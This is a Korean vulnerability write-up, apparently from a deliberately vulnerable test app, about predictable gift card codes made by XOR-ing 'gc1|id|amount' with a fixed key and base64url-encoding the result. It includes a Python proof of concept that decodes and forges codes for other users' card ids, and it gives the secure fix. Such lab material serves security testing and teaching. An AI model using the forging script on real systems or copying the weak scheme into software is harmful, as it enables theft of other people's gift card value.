# VULN-048 예측 가능한 상품권 코드 (구매 발급 코드 위조·열거)

- 대상 스택: node-express, java-spring (동일)
- 심각도: High
- 분류: A04:2025 Cryptographic Failures (CWE-330 Use of Insufficiently Random Values, CWE-340 Predictable Numbers/IDs)

## 위치

상품권 구매 시(`POST /api/{node,java}/giftcards/purchase`) 발급되는 코드가 **키리스 결정적 변환**으로
생성된다 — 난수(CSPRNG)가 전혀 없고 저엔트로피 입력(순차 id + 액면가)만 쓴다.

- node: `apps/node-express/src/gift-code.js` — `giftCode(id, amount)`:
  `"GC-" + base64url( XOR(bytes("gc1|"+id+"|"+amount), 0x2A) )`. `routes/giftcards.js`의 purchase가 임시 코드로
  insert → id 확보 → 이 값으로 UPDATE.
- java: `apps/java-spring/.../security/GiftCodes.java` — 동일 스킴(바이트 동일). `GiftCardController.purchase`.

3단계(payload 구성 → 고정키 XOR → base64url)라 겉보기엔 무작위지만, 하드코딩 키(`0x2A`)와 순차 id 때문에
가역·예측 가능하다. 등록(`/redeem`)은 소유권·중복을 검증하지 않으므로(VULN-043) 위조/추측한 코드로 타인
상품권을 소진할 수 있다.

## 트리거 방법

```
# 1) 내 상품권 몇 개 구매 → 코드 수집(예 GC-Xk9f...)
# 2) 스킴 역산: GC- 제거 → base64url 디코드 → 각 바이트 XOR 0x2A → "gc1|{id}|{amount}"
python3 - <<'PY'
import base64
def dec(code):
    raw = base64.urlsafe_b64decode(code[3:] + '='*(-len(code[3:])%4))
    return bytes(b ^ 0x2A for b in raw).decode()
print(dec("GC-....."))   # gc1|{id}|{amount} — id가 순차임이 드러남
def enc(i, amt):
    p = ("gc1|%d|%d"%(i,amt)).encode()
    return "GC-" + base64.urlsafe_b64encode(bytes(b^0x2A for b in p)).decode().rstrip("=")
# 3) 임의 id로 코드 위조 후 등록(소유권 미검증)
# POST /api/{stack}/giftcards/redeem {"code": enc(<victim_card_id>, <amount>)}
PY
```

로그인 필요 → nginx `:8090` 경유.

## 영향

- 타 사용자가 구매한 상품권 코드를 열거·위조해 **본인 포인트로 등록(소진)**. VULN-043(등록 재사용)과 결합하면
  금전적 탈취가 확대된다. 발급 코드가 사용자에게 노출되므로 한두 건만 관찰해도 전체 스킴이 드러난다.

## 증거 (재현 확인)

(Phase 2에서 `:8090` 실제 트리거 후 `YYYY-MM-DD 로컬 재현: 구매 코드 디코드→id 순차 확인→임의 id 위조
코드 redeem으로 포인트 취득` 기록 예정. 양 스택 코드 바이트 동일 확인.)

## 조치 상태: 미조치 (의도된 취약점)

정상 구현: 코드를 `crypto.randomBytes(16).toString('base64url')` / `SecureRandom` 등 128비트+ 무작위로 생성해
추측·열거·상관관계를 차단하고, 등록을 소유권·1회성으로 검증. 관련: [[VULN-043-gift-card-redeem-reuse]],
[[VULN-038-predictable-order-share-token]], [[VULN-039-weak-reset-token]].
